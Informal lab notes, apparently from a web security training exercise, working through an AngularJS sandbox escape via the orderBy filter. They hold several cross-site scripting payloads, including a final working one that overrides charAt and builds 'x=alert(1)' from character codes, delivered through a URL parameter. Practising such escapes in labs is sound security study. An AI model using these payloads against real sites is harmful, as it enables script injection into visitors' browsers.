Don't understand how angular really works so need to read some docs
Trying to use
 [123]|orderBy:'Some string' 
 to see which characters are blocked
 ' got escaped
 portswigger cheat sheet had
 toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
 the charCodes mean x=alert(1)
 the whole payload doesn't work as its limited to 120 characters
 'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';
 didnt work either 
 need to work with the above payload
 add it to the url rather than injecting it into the search bar
1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
mistake I made was trying it on firefox instead worked on chrome
